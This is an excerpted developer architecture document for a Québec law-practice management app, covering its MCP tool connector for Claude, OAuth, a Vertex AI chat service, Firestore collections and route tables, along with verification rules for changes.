...
1. **MCP connector** (`mcp/`, exposes data to Claude — 29 read tools + **23 write tools** in five families (CREATE, CORRECT, RECLASSIFY, IMPORT, DRAFTS — see the Tech Stack bullet), each with a **declared `outputSchema` contract** — and since Phase N the SAME handlers are ALSO called **in-process** by the chat client (`chat/executors.py`), so a handler change now has two consumers). *Touches it when the change edits:* `auth.py`/session, `security.py` (CSP, CSRF exemptions, rate limits, request-size caps, the App Check HTMX predicate, **`sanitize`/`TAG_RE`**), `config.py`, the OAuth collections, any `models/*` function the tools read **or write**, **or the SHAPE of any handler payload** (a key added/removed/renamed, a type changed, a new branch) — `mcp/output_schemas.py` is a MUST-conform contract on `structuredContent`, so a payload change without its schema+fixture change ships a violated contract that a strict client rejects with no error on our side. *Verify:* OAuth/bearer flow + both kill switches (`MCP_ENABLED`, `MCP_WRITE_ENABLED`) intact; no PII or signed URLs in tool output; date-only fields use `mcp.tools.date_str`, never `to_mtl`; no MCP-only query needs a new composite index; **schema and handler moved together** — every input property keeps a `description`, every output root keeps `type: "object"` (wire-mandated even beside `anyOf`; one bare root kills all 52 tools on SDK clients), no output schema gains `additionalProperties: false`, `required` gains only always-present keys, and a value flowing verbatim from a model matches its declared type on EVERY write path (web, DAV, MCP — the vobject list-in-address case); `test_mcp_*` green, `test_mcp_output_schemas.py` in particular. **The write tools make item #2 apply to this component** — a DAV-exposed write (note, task, hearing) that skips `bump_ctag(collection_for(dossier_id))` desyncs DavX5 silently, and since lot Q **a contact write must call `bump_ctag("parties")`**, which extends item #2 to a SECOND collection (the CardDAV addressbook). `mcp.tools.WRITE_TOOLS` is the pinned list and every member runs through `mcp/write_support.run_write` (`idempotency_key` — the `dry_run` preview left the protocol 2026-08-27). Two further verifications since lot Q: **a tool that MODIFIES a stored value must carry `destructiveHint: true`**, which is DERIVED from `mcp.tools.EDIT_TOOLS` and no longer a family constant — under-warning is worse than over-warning, since a client uses the hint to decide whether to confirm; and **a handler still repeats every model-side guard a caller can trip** (the discipline the retired dry branch used to demand — a refusal that names the field beats a bare model error; see the Known Gotcha). `complete_task` changes a task's STATUS and, through `models/task.update_task`, cascades into the linked protocol step (see the Known Gotcha), and the scope gate lives in `endpoint._tools_call` (never in a handler — `except Exception` there would turn a 403 into a 200).
...
- **MCP connector (Phase I, extended by Phase L, the July 2026 audit remediation and the August 2026 mandate):** a hand-rolled, stateless **JSON-response-mode Streamable HTTP** MCP server at `POST /mcp` (no SSE, no sessions) plus an **embedded OAuth 2.1 authorization server** (`mcp/` package), exposing **52 tools** to Claude as a custom connector — **29 read-only** (14 original + 3 Phase-K trust + `list_time_entries`/`list_expenses`/`list_deletions` + the August additions `list_invoices`/`get_invoice`/`get_coverage_report` + the Phase-N additions `get_document_text` (full document TEXT — PDF/.docx, bounded, honest about scanned pages) and `get_draft`/`list_drafts` + the lot-Q additions `get_reference_vocabulary`/`find_imported`/`get_import_audit`) and **23 writes in five families**. **CREATE:** notes (`create_note`/`append_to_note`), entities (`create_task`/`create_hearing`/`create_time_entry`/`create_expense`), lot Q's `create_partie` and `create_dossier`, and the dossier recorders (`complete_dossier` fill-only-if-empty, `record_signification`, `record_prescription_event`). **DRAFTS (Phase N):** `save_draft` creates a VERSIONED markdown draft (`chat_drafts` + append-only `versions` subcollection), `revise_draft` appends version n+1 and MOVES THE HEAD (∈ `EDIT_TOOLS` — the head is a stored value being replaced) — every prior version stays readable for ever, and no draft ever syncs to DAV. **CORRECT** — these REPLACE the value they name, an omitted field being left alone: `update_partie`, `update_dossier`, `update_time_entry` and `update_expense` (the last two only while the entry is un-invoiced — the models refuse otherwise), plus `complete_task`, the ONE status change (terminée/annulée/en_cours — never `à_faire`). **RECLASSIFY** (août 2026) — `set_time_entry_phase`, `set_expense_phase` and their `_bulk` twins (≤ 50 rows a call): the ONLY writes that reach a row already carried to an invoice, and they can touch NOTHING but `phase`/`sous_phase`. Safe there because that pair is on no invoice — the line items are independent copies without it — so the billing freeze, which exists to protect the money figures, never covered it; it feeds the dossier's budget-vs-actuals view, which counts billed work. The models write it through a four-key partial `update()`, never the merged `set()` of `update_*`, and `update_time_entry`/`update_expense` keep their refusal INTACT. **IMPORT:** `import_invoice`, which recreates an invoice the practice's previous system issued, under its own number and date, **without ever reading or advancing the year counter**, from real un-invoiced sources only, always into `brouillon`. **No tool can delete anything, set an invoice status, or record a payment.** `mcp.tools.EDIT_TOOLS` ⊆ `WRITE_TOOLS` is the subset that replaces a stored value and is what DERIVES `destructiveHint` — the annotation stopped being a family constant the day an edit shipped. Every write runs through `mcp/write_support.run_write` (24 h `idempotency_key` replay via the keyed `mcp_idempotency` collection). **The `dry_run` preview was RETIRED 2026-08-27** — it was never a control (nothing required it, nothing verified it, a caller who omitted it wrote), and it doubled every write into two model calls, which killed a document-analysis batch on `chain_ceiling` after 6 documents of 45; the removal is fail-closed, since no input schema declares the parameter and all carry `additionalProperties: false`, so sending it is REFUSED rather than ignored. **Zero new Python dependencies** — stdlib (`secrets`, `hashlib`, `base64`) + packages already pinned (Flask, flask-limiter, flask-wtf). Two kill switches: `MCP_ENABLED` (default `"true"`; `false` → every `/mcp` + `/oauth/*` route 404s) and `MCP_WRITE_ENABLED` (default `"true"`; `false` → the write tools vanish from `tools/list`, are refused at `tools/call`, and the consent checkbox disappears — reads unaffected).
...
- **Clavardage IA (Phase N, 2026-08-26) :** un client de conversation Claude **sur Vertex AI** (« Assistant » dans la nav), pour que le matériel privilégié ne transite jamais par un produit IA grand public — inférence sous le projet GCP du cabinet, registre append-only (`chat_conversations/turns`), outillage attribué et versionné. **Pas de streaming** : un tour s'exécute en **chaîne de Cloud Tasks** (file `chat-turns`, un appel Vertex par tâche, jeton d'étape transactionnel contre l'at-least-once) sur un **TROISIÈME service App Engine `chat`** (`chat.yaml` — F2, **SA par défaut** à dessein, gunicorn `--timeout 570` < le plafond 600 s des requêtes de tâches ; le `--timeout 60` du service default rendait l'exécution sur place impossible), et le navigateur POLLE (`hx-trigger="every 2s"`, arrêté par **HTTP 286** — support htmx natif). Transport = `requests` + ADC (`google-auth`) vers l'endpoint **GLOBAL** — le SEUL qui serve ces modèles (vérifié en direct 2026-08-26 : le multi-région `us` du spec répond 501, `us-east5` 404 ; tarif de BASE, multiplicateur 1.0 ; compromis de résidence accepté) —, aucun SDK Anthropic, aucun API key ; allowlist FERMÉE de modèles en config (`CHAT_MODELS` — **fournisseur et localisation PAR MODÈLE** depuis le 2026-08-26 : Sonnet 5 / Opus 5 en `global` chez Anthropic, rétention d'Opus 5 vérifiée non couverte ; **Gemini 2.5 Pro / Flash à MONTRÉAL**, ajoutés parce que le quota Anthropic est à zéro et refusé — voir le Known Gotcha ; les Covered Models Fable/Mythos EXCLUS, rétention 30 jours obligatoire) ; réflexion **adaptative** (`thinking: {"type": "adaptive", "display": "summarized"}` + `output_config.effort` par modèle — la forme à budget fixe et TOUT paramètre d'échantillonnage sont retirés et répondent 400 sur cette génération : voir le Known Gotcha), blocs (signatures incluses) et `encrypted_content` de web_search **rejoués byte-exact** (déchargés en Storage au-delà de 100 Ko, réhydratés sha256-vérifiés). Outils = les handlers MCP appelés **in-process** (`chat/registry.py` référence TOOLS par IDENTITÉ ; parité d'écriture D9 dérivée de WRITE_TOOLS) + les Workers juridiques REST (2 jetons distincts) + `web_search` natif (basique seulement sur Vertex). Tâches planifiées §12 (cron 15 min sur default, occurrence par date LOCALE Montréal, `jours_ouvrables` = jours juridiques) ; comptabilité de jetons par COMPTEURS (jamais de SUM) en USD. **La seule dépendance nouvelle : `pypdf`** (lecture du texte des pièces, décision D2). AUCUNE suppression nulle part ; effacement Loi 25 = runbook hors application (DEPLOYMENT.md §15).
...
2. **Firestore is flat.** Despite the single-user nature, Firestore **collections are top-level** (`parties`, `dossiers`, `tasks`, `hearings`, `notes`, `protocols`, `invoices`, `timeentries`, `expenses`, `documents`, `doc_templates`, `dav_sync`, `counters`, `ref_greffes`, `ref_juridictions`, `ref_palais`, the Phase-I OAuth collections `oauth_clients`, `oauth_codes`, `oauth_tokens`, the Phase-K trust collections `trust_accounts`, `trust_transactions`, `trust_reconciliations`, plus the July 2026 additions `audit_events` (append-only deletion journal) and `mcp_idempotency` (MCP write-replay cache), and `budgets` (August 2026 — per-dossier phase budgets, append-only versioned), plus the Phase-N chat collections `chat_conversations` (with its `turns` subcollection — the registre), `chat_drafts` and `chat_skills` (each with a `versions` subcollection), `chat_scheduled_tasks` and `chat_usage_dossier` (counters-only roll-up)). They are **not** nested under `users/{userId}/...`. Firebase Storage paths, however, **do** use `users/{userId}/dossiers/{dossierId}/documents/{documentId}/{filename}` (with `userId` from the Firebase Auth `uid` claim).
...
6. **UUIDv4 document IDs.** Generated server-side. Never reuse IDs. **Documented exceptions:** the OAuth collections use the lookup key as the doc ID — `oauth_clients/{client_id}`, `oauth_codes/{sha256(code)}`, `oauth_tokens/{sha256(token)}` — so raw credentials are never stored and validation is one keyed `get()`; `mcp_idempotency/{sha256(tool:key)}` follows the same keyed-`get()` pattern (the raw idempotency key is never stored); and **`chat_charter/charte`** — a singleton whose lookup key IS its id, which is what lets assembly be a keyed `get()` that exists or does not, and creation be implicit inside the revision transaction.
...
│   │   ├── chat_conversation.py    # Phase N : le REGISTRE (conversations + sous-collection
│   │   │                           # turns append-only, exception Règle 7 sans etag — le
│   │   │                           # step_token est LA garde) ; claim/commit transactionnels,
│   │   │                           # comptabilité par compteurs dans le commit terminal
│   │   ├── chat_draft.py           # Phase N : brouillons versionnés (tête + versions append-
│   │   │                           # only, provenance par ContextVar, AUCUN delete)
│   │   ├── chat_skill.py           # Phase N : compétences runtime (même forme versionnée ;
│   │   │                           # désactivation oui, suppression non)
│   │   └── chat_scheduled_task.py  # Phase N §12 : définitions + dispatch_occurrence — la CAS
│   │                               # d'occurrence ET tout le dispatch en UNE transaction
│   │
...
│   │   ├── chat.py                 # /chat/*  (Phase N: conversations, composer, fragment de
│   │   │                           # polling « every 2s » arrêté par HTTP 286, approuver/
│   │   │                           # refuser, compétences, tâches planifiées, brouillons +
│   │   │                           # « Verser en Word » — AUCUNE route de suppression)
│   │   ├── taches_chat.py          # POST /taches/chat/tour  (MACHINE — enregistré SEULEMENT
│   │   │                           # sur le service « chat »; garde X-AppEngine-QueueName ==
│   │   │                           # chat-turns; retryable → 503, le reste consommé en 200)
│   │   └── taches_chat_cron.py     # GET /taches/chat/planification  (MACHINE, cron 15 min
│   │                               # sur default: répartiteur des tâches planifiées §12.2)
│   │
...
│   │
│   ├── mcp/                        # MCP connector — 52 tools: 29 read + 23 writes
...
│   │   └── handlers.py             # 52 tool implementations (29 read + 23 writes) over models/* + utils/*
│   │                               # — also called IN-PROCESS by chat/executors.py (Phase N)
│   │
│   ├── chat.yaml                   # App Engine config of the THIRD service « chat » (Phase N —
│   │                               # F2, DEFAULT SA on purpose, gunicorn --timeout 570,
│   │                               # entrypoint chat.wsgi:app; worker-only, no hostname)
│   │
│   ├── chat/                       # Clavardage IA (Phase N) — Claude sur Vertex
│   │   ├── __init__.py             # package doc — import discipline (models/config ALLOWED,
│   │   │                           # contrast client/)
│   │   ├── wsgi.py                 # app = create_chat_app() — worker blueprint ONLY
│   │   ├── app.py                  # Factory: origin-secret/size/headers hooks, NO CSRFProtect
│   │   ├── vertex.py               # raw-requests Messages API client (rawPredict, ADC per
│   │   │                           # call, retryable/fatal taxonomy) + pricing usd_micros
│   │   ├── turn_engine.py          # claim → work → commit; offload/rehydration VERBATIM;
│   │   │                           # pause_turn; ceiling; the native-PDF fallback (D2)
│   │   ├── taches.py               # enfiler_tour → queue « chat-turns », routing service: chat
│   │   ├── planification.py        # §12: est_due (Montréal, jours juridiques), dispatch CAS,
│   │   │                           # passe de réparation, livrer_rapport (courriel §12.4)
│   │   ├── charter.py              # le SOCLE de la charte (sous revue de code) + le
│   │   │                           # texte SOURCE gelé par sha (= version 1, le plancher
│   │   │                           # du repli) + l'assemblage des blocs system. Le CORPS
│   │   │                           # et l'addendum planifié vivent dans `chat_charter`
│   │   ├── registry.py             # registre chat: TOOLS par IDENTITÉ + workers + web_search;
│   │   │                           # CHAT_WRITE_TOOLS dérivé (parité D9); GATED_TOOLS vide v1
│   │   ├── executors.py            # exécution in-process (validate_args refait, refus →
│   │   │                           # tool_result, jamais d'exception hors du tour)
│   │   ├── worker_tools.py         # specs REST des Workers legislation/jurisprudence (DATA,
│   │   │                           # tuple vide à la livraison — liaison tardive D5)
│   │   ├── worker_client.py        # client HTTP borné (2 jetons distincts D10; échec → refus FR)
│   │   ├── mail_tools.py          # Messagerie : SPÉCIFICATIONS (données) +
│   │   │                          # logique PURE — n'importe aucun modèle (le
│   │   │                          # registre est importé par des tests sans
│   │   │                          # Firestore) ; l'UNION dossier → adresses +
│   │   │                          # jetons d'identité, le curseur de fil (une
│   │   │                          # POSITION, jamais un nextLink), la clé de
│   │   │                          # brouillon
│   │   └── mail_executor.py       # Messagerie : exécution (modèles en import
│   │                              # PARESSEUX) ; ne lève jamais hors d'un tour
│   │
...
│   │   ├── pdf_text.py             # Phase N (pur, pypdf + stdlib): extraction bornée du
...
│   │   ├── graph_messagerie.py     # Boîte de courriels du juriste (lot 2026-08-28,
│   │   │                           # pur) : lecture BORNÉE (jamais graph_get, dont la
│   │   │                           # fusion nextLink n'a AUCUN plafond), $select
│   │   │                           # obligatoire sur les pièces jointes (sans lui Graph
│   │   │                           # inline chaque pièce en base64), ids percent-encodés,
│   │   │                           # budget de tour par ContextVar, reprise 429 — jamais
│   │   │                           # un 5xx en écriture —, brouillons. AUCUN verbe d'envoi.
...
│   │   │                           # taxe (avec une taxe, le net est un choix
│   │   │                           # comptable : le script REFUSE d'y toucher)
...
│   │   ├── components/             # Reusable partials (empty_state, pagination,
│   │   │                           # _export_dropdown[_oob], _phase_selector, _file_icon…
│   │   │                           # — the orphan modal/toast/confirm_dialog/
│   │   │                           # loading_skeleton files were deleted 2026-08-26,
│   │   │                           # nothing ever included them)
...
│   │   ├── tasks/                  # list, detail, form + _task_rows
│   │   ├── notes/                  # list, detail, form + _note_rows
│   │   ├── protocols/              # list, detail, form + _protocol_rows
│   │   ├── documents/              # list, detail, upload, edit + _browser, _folder_tree
...
│   │   ├── chat/                   # Phase N: list, new, conversation + _turn/_pending
│   │   │                           # (polling 286)/_authorization_card, skills ×3,
│   │   │                           # tasks ×2, drafts ×2 — « Réflexion » et les chips
│   │   │                           # d'outils en <details> natif, texte via le filtre
│   │   │                           # markdown existant dans .note-content
...
```python
{
    ...
    # Analyse documentaire (SPEC Phase K §8, livrée 2026-08-27). Additifs,
    # sans migration : un document jamais analysé n'a ni `analyse` ni
    # `category_source`, ce qui est vrai.
    "category_source": "juriste" | "analyse",   # PROVENANCE de `category`.
                                          # C'est elle qui fait paraître la
                                          # mention « présumé » à l'écran ET
                                          # dans la sortie MCP. Absente =
                                          # juriste. `confirmer_analyse` la
                                          # repasse à « juriste ».
    "analyse": {                          # Le CACHE de la dernière analyse;
                                          # le journal ci-dessous fait foi.
        "statut": "prete" | "en_attente" | "en_cours" | "echec"
                | "non_applicable",       # « prete » sur le chemin chat; les
                                          # autres attendent le pipeline §9
        "sous_nature": str,               # code FERMÉ (utils/analyse_taxonomies)
        "nature_detectee": str,           # DÉRIVÉ du code par nature_of()
        "famille": str,                   # DÉRIVÉ — JUDICIAIRE | CORRESPONDANCE
                                          #   | PREUVE | CABINET | INDETERMINE
        "privileges": list[str],          # CUMULABLE (Annexe D)
        "niveau_protection": int | None,  # DÉRIVÉ — 0 public … 3 secret prof.
        "motifs_protection": list[str],
        "champs_attendus_absents": list[str],       # DÉRIVÉ
        "alerte_dispositif_detecte": bool,          # PV portant le jugement
        "alerte_renonciation_possible": bool,
        "categorie_precedente": str,      # ce que l'écrasement a remplacé
        "categorie_precedente_source": str,
        "categorie_remplacee": bool,
        "remplace_un_choix_du_juriste": bool,   # ne se lève que sur un choix HUMAIN
        "confirme": bool,                 # JAMAIS vrai par un chemin automatique
        "confirme_par": str | None, "confirme_le": datetime | None,
        "resume": str, "indices_protection": list[str], "confiance": str,
        "numero_dossier_cour"/"tribunal"/"district_judiciaire"/"auteur"/
        "parties_mentionnees"/"date_document_str"/… ,   # l'extrait tel que
                                          # fourni; les noms restent des
                                          # CHAÎNES LIBRES, jamais un partie_id
        "declenche_par": str, "modele": str, "genere_le": datetime,
        "analyse_id": UUIDv4,
    },
}
```
...
### `documents/{documentId}/analyses/{analyseId}` — Journal des analyses (août 2026)

**Write-once, append-only** — une entrée par exécution, jamais modifiée ni
supprimée; le champ `analyse` du document n'en est que le cache. Ce n'est pas
du zèle : une analyse relancée après changement d'invite ou de modèle produit
des classifications différentes, et savoir **quelle version a dit quoi, quand,
avec quel modèle** est la condition d'auditabilité. C'est aussi ce qui rend
APPLICABLE la règle de non-déclassement — sans historique, on ne peut pas
constater qu'un niveau de protection a baissé. Chaque entrée porte le champ
`analyse` complet, `categorie_precedente` comprise. Lue par
...
```python
{
    ...
    "args_hash": str,                 # sha256 fingerprint (idempotency_key
                                      # excluded; the retired dry_run stays
                                      # in _PROTOCOL_ARGS, inert — no schema
                                      # accepts it any more)
...
### Chat collections (Phase N — clavardage IA)

Six top-level collections + five subcollections. `chat_conversations`, `chat_skills`, `chat_charter` and `chat_scheduled_tasks` are Rule 7 complete (they ARE mutated). **Rule-7 exceptions, documented:** the `turns` and `versions` subcollections carry NO `etag` (turns: the `step_token` is THE concurrency guard, an etag would be a second redundant token; versions: write-once), and `chat_usage_dossier` is a counters-only doc. **No delete path exists anywhere** — erasure is the out-of-band Loi-25 runbook (DEPLOYMENT.md §15).

- **`chat_conversations/{uuid4}`** — `{dossier_id ("" = flottante, IMMUTABLE after creation — added to dossier._CHILD_COLLECTIONS, so deletion of a dossier with conversations is refused), dossier_file_number/title snapshots, owner_uid (the Storage tenant key), title, model (∈ CHAT_MODELS), skill_selection, origin ∈ interactive|planifiee, scheduled_task_id, unread, turn_count, active_turn_id (the ONE-chain-in-flight marker, maintained by the same transactions that move turn state), token_totals (counters), cost_snapshot {usd_micros_total, pricing_version}, courriel_livre (the §12.4 at-most-once marker)}`.
- **`chat_conversations/{id}/turns/{seq:06d}`** — THE REGISTRE. Zero-padded ids → `__name__` order is chronological, no index. User turns write-once (`role, content, by, created_at`); assistant turns mutable only while non-terminal: `{state ∈ pending|running|awaiting_authorization|final|failed, step, step_token, continuation {token, enqueued} (the crash-repair flag), segments[] (one per Vertex call: blocks VERBATIM incl. thinking signatures — a block whose JSON exceeds CHAT_BLOCK_OFFLOAD_BYTES becomes a {type:"storage_ref", path, sha256, preview} pointer to users/{uid}/chat/{conv}/{turn}/{uuid}.json, rehydrated byte-exact at assembly; usage; pricing {version, usd_micros}; stop_reason; tool_results), authorization {calls, decision}, skill_versions, charter_version, charter_source ("" | firestore | amorcage | repli — le numéro seul est ambigu, voir le Known Gotcha), addendum, vertex_calls_started/recorded (the HONEST drift pair — a crash between the Vertex response and the commit loses that call's usage and the retry re-pays it; the drift is the recorded measure), error, truncated, finalized_at}`.
- **`chat_drafts/{uuid4}`** + **`versions/{n:06d}`** — the rédaction deliverable: head (content copy ≤ 120k = MAX_MARKDOWN_CHARS, the « versable en Word » guarantee) + append-only versions carrying `provenance {created_via ∈ chat|connector|scheduled, conversation_id?, turn_id?, model?, skill_versions?, charter_version?}` (transported by ContextVar `chat_draft.PROVENANCE`, never schema args). Dossier binding immutable; in `_CHILD_COLLECTIONS`.
- **`chat_skills/{uuid4}`** + **`versions/{n:06d}`** — runtime skills (§5): head-at-each-turn binding, the exact `(skill_id, version)` pairs recorded on every turn. `active` toggles; nothing deletes. **Fichiers de référence (2026-08-26 — le modèle des Skills de Claude Code)** : le corps reste la partie toujours chargée ; chaque version (et la tête, motif « head copy ») porte un manifeste `files: [{name, description, sha256, chars}]`, les CONTENUS vivant dans la sous-collection adressée par contenu **`fichiers/{sha256}`** (`{content, chars, created_at}`, write-once — retirer un fichier = nouvelle version sans lui, rien ne s'efface). Le modèle les lit À LA DEMANDE via l'outil **local au chat `get_skill_file`** (executor `skill_file`, jamais dans `mcp.tools.TOOLS` → inatteignable du connecteur claude.ai), résolu à la paire `(skill_id, version)` ÉPINGLÉE sur le tour — jamais une tête relue. Plafonds : 6 fichiers × 40 000 caractères (`models/chat_skill.py`). ⚠ **L'arithmétique du plafond de requête a été corrigée le 2026-08-27** : la note annonçait « ~816 Ko pessimiste » sous un en-tête « ×6 » — c'est un chiffre ×3. En urlencodé un accent coûte SIX octets (`é` → `%C3%A9`) et un tiret cadratin NEUF, donc 6 × 40 000 + 30 000 caractères tout accentués font **1,55 Mio**, au-delà du plafond de 1 Mo de `_enforce_request_size` — qui `abort(413)` vers une page d'erreur BRUTE et perd toute la saisie. Les deux formulaires versionnés (compétence ET charte) postent donc en **`multipart/form-data`**, où la même charge reste à ~297 Ko quel que soit l'alphabet. Relever un plafond exige de REFAIRE ce calcul, jamais d'éditer le nombre.
- **`chat_charter/charte`** + **`versions/{n:06d}`** + **`fichiers/{sha256}`** — la CHARTE, éditable depuis le 2026-08-27 (décision du praticien). Même forme versionnée append-only que les compétences : `{id, body, addendum, files[], current_version, created_at, updated_at, etag}`, aucun `active`, **aucune suppression, aucune désactivation** (il y a toujours exactement une charte). **Exception documentée à la Règle 6** : l'id est la constante `charte` — la clé de recherche EST l'identifiant (le motif `oauth_clients/{client_id}`), et c'est ce qui permet à l'assemblage d'être **un `get()` cléé qui existe ou n'existe pas** et à la création d'être implicite DANS la transaction. Le même jeton sert de `skill_id` réservé pour lire un fichier de la charte via `get_skill_file` (`uuid.UUID("charte")` lève, donc aucune collision possible). ⚠ **`versions` commence à 2 : la version 1 est le TEXTE SOURCE de `chat/charter.py`**, gelé par sha, et c'est ce que porte tout tour antérieur au lot comme tout tour tombé en repli. Le SOCLE (identité, devoirs épistémiques, données privilégiées, absence de suppression) reste sous revue de code et est prépendé à toute version enregistrée : un lapsus à l'écran ne peut donc ni effacer une règle déontologique, ni briquer le clavardage. Verbe unique `revise_charter` ; `get_head()` rend un TRI-ÉTAT `(doc, ok|absent|erreur)`, où « erreur » couvre aussi un corps blanc.
- **`chat_scheduled_tasks/{uuid4}`** — §12: `{name, prompt, model, skill_selection, recurrence {kind ∈ quotidien|jours_ouvrables|hebdomadaire, day}, hour_local, dossier_id (default "" = flottante), deliver_email, active, last_occurrence, occurrences {"YYYY-MM-DD": {conversation_id, dispatched_at}} — the idempotency CAS keyed on the LOCAL Montréal date (DST-proof), usage_totals, usd_micros_total}`. `dispatch_occurrence` writes conversation + 2 turns + the marker in ONE transaction, so a marked occurrence always HAS its conversation.
- **`chat_usage_dossier/{dossier_id}`** — counters-only roll-up (tokens + usd_micros), incremented inside the terminal commit transaction. Counters, never SUM aggregations.
...
| `/factures/unbilled/<dossier_id>` | GET | HTMX list of unbilled time entries + expenses — **latent : aucune UI n'y mène** (the create flow is full-page and `invoice_new` loads the unbilled items itself; audit 2026-08-26, conservé sur décision utilisateur) |
...
| `/documents/<id>/edit` | GET / POST | Édition des métadonnées **et de l'analyse** (2026-08-27, décision du praticien : « whatever the analysis outputs becomes an editable field »). `templates/documents/_analyse_form.html` rend les 25 champs, vocabulaires tirés des modules PURS (jamais un littéral recopié). Le champ caché `analyse_presente` distingue « la section n'a pas été soumise » de « le juriste a tout vidé » : sans lui, enregistrer les seules métadonnées de base effacerait l'analyse entière, le contrat de `update_analyse` étant qu'une clé présente et vide efface |
| `/documents/<id>/analyse/confirmer` | POST | **Le SEUL chemin levant `confirme`** (§7). Aucun automatisme : une qualification d'« acte authentique » ou de « public » a des conséquences, et une supposition de modèle ne doit pas se présenter avec l'autorité d'une détermination de l'avocat. Il repasse aussi `category_source` à « juriste », ce qui fait tomber la mention « présumé ». Un refus voyage sur une redirection 2xx |
| `/documents/<id>/move` | POST | Move to a folder (Firestore-only, Storage path unchanged) |
| `/documents/move-bulk` | POST | Batch move — **latent : aucune UI n'y mène** (audit 2026-08-26 ; conservé sur décision utilisateur — à câbler ou supprimer avec `folders/<fid>/move` + `folder-tree`, jamais laissé s'étendre) |
...
| `/documents/folders/<fid>/move` | POST | Change parent (with circular-ref check) — **latent : aucune UI n'y mène** (audit 2026-08-26) |
...
| `/documents/folder-tree` | GET | HTMX folder tree — **latent : aucune UI ne l'appelle** (the live move modal includes `_folder_tree.html` server-side; audit 2026-08-26) |
...
The **29 read-only tools** (`get_agenda`, `list_dossiers`, `get_dossier`, `list_tasks`, `list_hearings`, `list_notes`, `get_note`, `list_documents`, `list_parties`, `get_partie`, `get_billing_snapshot`, `list_protocol_steps`, `compute_judicial_deadline`, `parse_court_file_number`, the Phase-K trust tools `get_trust_balance`, `list_trust_transactions`, `get_trust_snapshot`, the July 2026 additions `list_time_entries`, `list_expenses`, `list_deletions`, the August 2026 additions `list_invoices`, `get_invoice`, `get_coverage_report`, the lot-Q additions `get_reference_vocabulary` (the controlled vocabularies the models validate but never enumerate in a refusal), `find_imported` (the durable anti-duplicate lookup by `legacy_ref`) and `get_import_audit` (IMP-01..07 over one reprised dossier), and the Phase-N additions `get_document_text` (a document's TEXT LAYER — PDF/.docx, bounded per call, `pages_without_text` the honest scanned-page signal, NEVER OCR'd; the consent screen names the fact that full pièce content transits claude.ai), `get_draft` and `list_drafts` (the drafts' read-back half)) and the **23 write tools** (`create_note`, `append_to_note`, `create_task`, `create_hearing`, `create_time_entry`, `create_expense`, `complete_dossier`, `record_signification`, `record_prescription_event`, `complete_task`, lot Q's `create_partie`, `update_partie`, `create_dossier`, `update_dossier`, `update_time_entry`, `update_expense`, `import_invoice`, the August 2026 reclassifiers `set_time_entry_phase`, `set_expense_phase`, `set_time_entry_phase_bulk`, `set_expense_phase_bulk`, and Phase N's `save_draft`/`revise_draft` (versioned drafts — `revise_draft` ∈ EDIT_TOOLS) — pinned in `mcp.tools.WRITE_TOOLS`, requiring `athena:write`; every one runs through `mcp/write_support.run_write` for `idempotency_key` (the `dry_run` preview left the protocol 2026-08-27); **none can delete anything, set an invoice status, or record a payment**) live in `mcp/handlers.py` with schemas in `mcp/tools.py`. `tools/list` is **filtered by granted scope**, so a read-only connection never sees the write tools. Descriptors are **fully specified** (July 2026): French `title` + `annotations.title` mirror (2025-03-26 compat), per-usage `description` on every input property, and a declared `outputSchema` per tool (`mcp/output_schemas.py`) with `structuredContent` emitted on protocol ≥ 2025-06-18 — see the Known Gotchas entry for the three schema rules. **Trust tools never emit the bank transit or account number** (`list_trust_transactions` emits neither transit/last4/institution; `get_trust_snapshot` may emit the account name + institution but never the transit or last4). Conventions: money as `*_cents` + fr-CA `*_display`; date-only fields as `YYYY-MM-DD` (UTC calendar date); true timestamps as ISO-8601 America/Montreal; every list tool capped at 50 items with a `truncated` flag; no signed URLs or storage paths ever in tool output. **Phase O (août 2026) :** `create_task`/`create_time_entry`/`create_expense` acceptent `phase`/`sous_phase` **optionnels** — enums **DÉRIVÉS** de `utils/phases.py` (module pur importé directement par `mcp/tools.py`, le précédent `_COVERAGE_CODES` — jamais des littéraux copiés) ; `sous_phase` seule → phase déduite du préfixe ; phase seule → `-00` imputé ; couple contradictoire → refus français AVANT écriture (`handlers._resolve_phase_pair`) ; l'écho `entity` porte les deux champs (contrat outputSchema).
...
| `/fideicommis/<id>/compenser` · `/compenser-lot` | POST | Single / bulk clear (all-or-nothing) — **`/compenser-lot` est latent : aucun formulaire n'y poste** (the worksheet's completion clears in-transaction; audit 2026-08-26 — its admin twin `clear_transactions_bulk` is equally caller-less; if ever removed, both sides in ONE commit per `test_comptabilite_parity.py`) |
...
| `/fideicommis/client/<client_id>` | GET | Consolidated « Vue de gestion » across dossiers — **not a register**, no control, no export. **Latent : aucun lien entrant** (reachable only by typing the URL; audit 2026-08-26 — wiring it is one anchor from the carte-client) |
...
### `chat.py` — `/chat/*` (Phase N — clavardage IA)

All `@login_required`, French UI, standard CSRF, PRG with `?erreur=`/`?message=` (the 2xx-refusal discipline). **No delete route exists** (pinned by the static sweep in `tests/test_chat_ui.py`). The pending-turn fragment is the repo's FIRST `hx-trigger="every 2s"` poll, terminated by **HTTP 286** (native htmx 2.0.4 — verified in the vendored file: 286 stops polling AND still swaps, so one response renders the final turn and kills the poller).

| Route | Method | Purpose |
|---|---|---|
| `/chat/` | GET | Conversation list — bounded read (200) + Python group-by: « Flottantes » FIRST (scheduled runs land there, unread-chipped), then dossier groups. ZERO composite index |
| `/chat/nouvelle` · `/chat/` | GET · POST | New conversation (dossier picker optional — attachment PERMANENT; model radios from the closed allowlist; skills checkboxes; optional first message → the title default, FLAG 9) |
| `/chat/<id>` | GET | Conversation view (marks read): transcript with « Réflexion » in native `<details>`, tool chips, failed banners, the cost indicator (USD), the composer (disabled while a turn is in flight — one chain per conversation, `active_turn_id`) |
| `/chat/<id>/message` | POST | Start a turn: transactional user+assistant pair, 409-in-French while in flight, enqueue onto `chat-turns`; enqueue failure → `?erreur=enfilage` banner + a « Relancer » affordance on the pending fragment |
| `/chat/<id>/tour/<tid>/fragment` | GET | The poll: non-terminal → 200 phase line (réflexion…/outil : …/recherche…/rédaction…); terminal AND awaiting_authorization → **286** + the final `_turn.html` |
| `/chat/<id>/tour/<tid>/relancer` | POST | Re-enqueue a never-enqueued chain (safe: a live chain's claim skips) |
| `/chat/<id>/tour/<tid>/approuver` · `/refuser` | POST | The §4.6.3 decision (whole batch); re-arms the chain via `decide_authorization` + enqueue |
| `/chat/<id>/competences` | POST | Change the skill selection — effective next turn (§5) |
